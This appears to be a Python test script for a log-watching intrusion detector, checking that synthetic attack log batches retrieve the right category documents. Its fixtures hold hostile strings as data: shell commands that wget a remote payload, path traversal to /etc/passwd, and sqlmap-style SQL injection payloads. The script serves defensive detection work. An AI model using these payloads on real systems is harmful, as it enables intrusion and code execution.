#!/usr/bin/env python3
"""Valida retrieval dos docs novos/reforcados pelo PLANO_ADAPTACAO_LIDDS.md (sem HyDE,
igual ao eval_retrieval_threshold.py, ja que nao ha servidor LLM local nesta sessao).

Positivo: batch parecido com a evidencia real de cada cenario deve recuperar a categoria certa.
Negativo: um batch sintetico nao relacionado nao deve recuperar os docs novos por engano.
"""
import sys
sys.path.insert(0, "/home/pedro/Github/cerise-desktop-project")
from log_watcher import RagRetriever

POSITIVE = [
    ("[network:mysql] accept fd=47(<4t>172.17.0.1:54386->172.17.0.9:3306) tuple=172.17.0.1:54386->172.17.0.9:3306\n"
     "[network:mysql] write res=77 data=Access denied for user 'root'@'172.17.0.1' (using password: YES)\n"
     "[network:mysql] accept fd=39(<4t>172.17.0.1:36308->172.17.0.9:3306)\n"
     "[network:mysql] write res=77 data=Access denied for user 'root'@'172.17.0.1' (using password: YES)\n"
     "... repeated 39 times in under 100ms ...\n"
     "[network:mysql] write res=11 data=SET AUTOCOMMIT = 0\n"
     "[ebpf:mysql] write create database textDB as root, no credential change observed",
     "privilege_escalation.md"),

    ("[network:web] GET /private/upload.php HTTP/1.1 user=admin\n"
     "[network:web] GET /private/upload.php HTTP/1.1 user=root\n"
     "[network:web] GET /private/upload.php HTTP/1.1 user=manager\n"
     "[network:web] GET /private/upload.php HTTP/1.1 user=cisco\n"
     "[network:web] GET /private/upload.php HTTP/1.1 user=apc\n"
     "... 19 attempts each username, all within the same second, single source IP ...",
     "network_suspicious.md"),

    ("[ebpf:apache2] open /tmp/phpPCwkV2 O_CREAT|O_EXCL\n"
     "[ebpf:apache2] rename /tmp/phpPCwkV2 -> /var/www/html/hackable/uploads/tmpw0n2_a8k\n"
     "[ebpf:apache2] chmod /var/www/html/hackable/uploads/tmpw0n2_a8k\n"
     "[ebpf:apache2] clone -> sh -c 'uname -a'\n"
     "[ebpf:sh] execve /bin/uname -a\n"
     "[ebpf:apache2] clone -> sh -c 'wget http://x/payload'",
     "suspicious_exec.md"),

    ("[ebpf:pstoedit] execve /usr/bin/gs -q -dDELAYBIND -dWRITESYSTEMDICT -dNODISPLAY -dNOEPS /tmp/psinXs9oJ1\n"
     "[ebpf:gs] uid=0 clone -> sh -c 'wget https://example/payload'\n"
     "[ebpf:sh] execve /usr/bin/wget",
     "suspicious_exec.md"),

    ("[ebpf:java] stat evil/../../../../../../../../../../etc(/etc)\n"
     "[ebpf:java] open /etc/passwd name=evil/../../../../../../../../../../etc/passwd flags=O_TRUNC|O_CREAT|O_WRONLY\n"
     "[ebpf:java] extracting archive /service/upload/evil.zip",
     "sensitive_file_access.md"),

    ("[ebpf:puma] open /usr/src/blog/app/assets/images/../../../../../../etc/passwd flags=O_RDONLY\n"
     "[ebpf:puma] read fd=18 size=16384\n"
     "[network:web] write file://app/assets/images/../../../../../../etc/passwd?id=xyz",
     "sensitive_file_access.md"),

    # NOTA: a query anterior deste caso descrevia "muitas respostas de ~16KB", que a
    # Fase 2 provou NAO ser discriminante (aparece igual em trafego normal). A query
    # agora descreve o sinal real: mismatch de comprimento no registro de heartbeat TLS.
    ("[network:tls] heartbeat request received: declared payload length 65535, actual payload sent 1 byte\n"
     "[network:tls] heartbeat response returned 65535 bytes to the client\n"
     "[network:tls] response body contains fragments of unrelated session data (cookies, other requests)\n"
     "[network:tls] repeated heartbeat records with no application request/response exchange in between",
     "memory_disclosure.md"),

    ("[network:web] GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(...)\n"
     "[network:web] GET /vulnerabilities/sqli/?id=(SELECT (CASE WHEN (5105=4322) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))\n"
     "[network:web] GET /vulnerabilities/sqli/?id=1 AND (SELECT 6413 FROM (SELECT(BENCHMARK(5000000,MD5(0x41))))a)\n"
     "... 40 requests in 13 seconds against the same parameter, each a different sqlmap technique ...",
     "sql_injection.md"),
]

NEGATIVE_BATCH = (
    "[ebpf:cron] execve /usr/bin/rsync -a /data /backup/daily\n"
    "[network:app] connect 10.0.0.5:5432 postgres keepalive\n"
    "[ebpf:apt] open /var/lib/apt/lists/partial O_RDONLY\n"
    "[network:dns] query A example.internal\n"
)


def main():
    retriever = RagRetriever()
    if not retriever.collection or retriever.collection.count() == 0:
        print("[ERROR] Vector DB vazio. Rode indexer.py primeiro.")
        sys.exit(1)

    print("=== POSITIVOS (deve recuperar a categoria esperada) ===")
    hits = 0
    for query, expected in POSITIVE:
        result = retriever.retrieve_context(query)
        top = result["raw_category"] + ".md" if result["raw_category"] != "UNKNOWN" else "UNKNOWN"
        ok = "OK " if top == expected else "MISS"
        hits += (top == expected)
        cats = [c["category"] + ".md" for c in (result.get("candidates") or [])]
        print(f"[{ok}] expected={expected:<26} top={top:<26} score={result['score']:.2f} candidates={cats}")
    print(f"\nhit-rate: {hits}/{len(POSITIVE)}")

    print("\n=== NEGATIVO (batch generico nao deve puxar os docs NOVOS por engano) ===")
    result = retriever.retrieve_context(NEGATIVE_BATCH)
    top = result["raw_category"] + ".md" if result["raw_category"] != "UNKNOWN" else "UNKNOWN"
    cats = [c["category"] + ".md" for c in (result.get("candidates") or [])]
    print(f"top={top} score={result['score']:.2f} candidates={cats}")
    new_docs = {"memory_disclosure.md", "sql_injection.md"}
    if new_docs & set(cats):
        print(f"[WARNING] doc(s) novo(s) apareceram em contexto irrelevante: {new_docs & set(cats)}")
    else:
        print("[OK] nenhum doc novo recuperado no batch negativo")


if __name__ == "__main__":
    main()
